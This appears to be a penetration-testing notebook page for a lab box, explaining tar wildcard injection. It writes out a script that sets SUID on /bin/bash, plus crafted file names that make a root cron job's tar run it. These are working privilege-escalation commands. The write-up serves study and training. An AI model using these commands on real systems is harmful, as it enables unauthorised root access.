# Tar Wilcard Injection

![](<../../../.gitbook/assets/image (46).png>)

![](<../../../.gitbook/assets/image (63).png>)

Check to see where these scripts change their directory to. In this case it was the /var/www/html directory, somewhere were we have write access.&#x20;

### 1ST METHOD&#x20;

```
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
echo "chmod +s /bin/bash" > exploit.sh
alice@readys:/var/www/html$ 
```

We then create two empty files using `touch`. The first will cause `tar` to cause a checkpoint on every file and the second will tell `tar` to execute our **exploit.sh** with `bash` on every checkpoint.

```
alice@readys:/var/www/html$ touch ./"--checkpoint=1"
touch ./"--checkpoint=1"
alice@readys:/var/www/html$ touch ./"--checkpoint-action=exec=bash exploit.sh"
touch ./"--checkpoint-action=exec=bash exploit.sh"
```

After a few minutes, we check if the cron job has run and if SUID is set on **/bin/bash**.

```
alice@readys:/var/www/html$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

You can follow this blog for the other different methods to escalate.&#x20;

{% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}

Refer to the box Readys.&#x20;

<details>

<summary>Examples</summary>

[https://app.gitbook.com/s/cG3oCXV6GXQITzoSNBJK/priv-escalation](https://app.gitbook.com/s/cG3oCXV6GXQITzoSNBJK/priv-escalation)

</details>
